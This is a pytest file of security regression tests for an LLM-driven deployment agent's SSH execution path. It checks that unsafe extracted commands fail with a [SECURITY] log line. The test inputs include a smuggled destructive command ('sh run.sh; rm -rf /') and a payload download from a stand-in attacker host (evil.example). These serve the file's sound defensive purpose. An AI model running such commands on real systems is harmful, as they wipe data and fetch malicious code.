"""Security regression tests for the deployment agent's SSH command execution
path — a step whose (LLM-extracted) command contains shell metacharacters must
be rejected before it ever reaches exec_command, not executed verbatim."""
import pytest

from app.modules.dba.deployment import deployments as deployments_module


def _trigger(client, headers, monkeypatch, extracted_steps):
    """POST a deployment with extract_deployment_steps patched to return a
    fixed step list, bypassing the LLM/regex extraction entirely so the test
    exercises exactly the post-extraction validation path."""
    monkeypatch.setattr(deployments_module, "extract_deployment_steps", lambda content: extracted_steps)
    r = client.post("/deployments/", json={
        "source_doc_type": "chat",
        "source_content": "irrelevant — extract_deployment_steps is patched",
        "target_instance": "DEV",
    }, headers=headers)
    assert r.status_code == 201, r.text
    return r.json()["id"]


class TestDeploymentCommandValidation:

    def test_unsafe_command_is_rejected_not_executed(self, client, admin_headers, monkeypatch):
        """A step whose command contains a shell-injection payload ends the
        deployment as failed with a [SECURITY] log line, and never reaches
        _simulate_step_logs / real exec_command."""
        deployment_id = _trigger(client, admin_headers, monkeypatch, [{
            "file_name": "run.sh",
            "execution_type": "shell_script",
            "command": "sh run.sh; rm -rf /",
        }])

        r = client.get(f"/deployments/{deployment_id}", headers=admin_headers)
        assert r.status_code == 200
        assert r.json()["status"] == "failed"

        steps = client.get(f"/deployments/{deployment_id}/steps", headers=admin_headers).json()
        assert len(steps) == 1
        assert steps[0]["status"] == "failed"
        assert "[SECURITY]" in steps[0]["log_output"]
        assert "rm -rf" not in steps[0]["log_output"].split("[SECURITY]")[0]

    def test_wrong_leading_tool_is_rejected(self, client, admin_headers, monkeypatch):
        """A command that doesn't start with the tool expected for its
        execution_type (e.g. a host_copy step whose command is actually a
        network download) is rejected — even with no shell metacharacters at
        all, exercising the allowlist layer independently of the denylist."""
        deployment_id = _trigger(client, admin_headers, monkeypatch, [{
            "file_name": "custom.jar",
            "execution_type": "host_copy",
            "command": "wget http://evil.example/payload.jar",
        }])

        r = client.get(f"/deployments/{deployment_id}", headers=admin_headers)
        assert r.json()["status"] == "failed"

        steps = client.get(f"/deployments/{deployment_id}/steps", headers=admin_headers).json()
        assert "[SECURITY]" in steps[0]["log_output"]

    def test_legitimate_command_still_executes_in_simulator(self, client, admin_headers, monkeypatch):
        """Sanity check: a well-formed command for its execution_type is not
        rejected by the new validation and the deployment completes normally
        in simulator mode (no ssh_host/db configured). Uses shell_script (not
        a SQL_ONLY_TYPES type) so it exercises the general SSH/simulated loop
        — a SQL-only step with no ssh_host instead routes through the
        separate Direct-DB path (_execute_sql_directly), which isn't part of
        this hardening pass."""
        deployment_id = _trigger(client, admin_headers, monkeypatch, [{
            "file_name": "run_patch.sh",
            "execution_type": "shell_script",
            "command": "sh run_patch.sh",
        }])

        r = client.get(f"/deployments/{deployment_id}", headers=admin_headers)
        assert r.json()["status"] == "completed"

        steps = client.get(f"/deployments/{deployment_id}/steps", headers=admin_headers).json()
        assert steps[0]["status"] == "success"
        assert "[SECURITY]" not in (steps[0]["log_output"] or "")
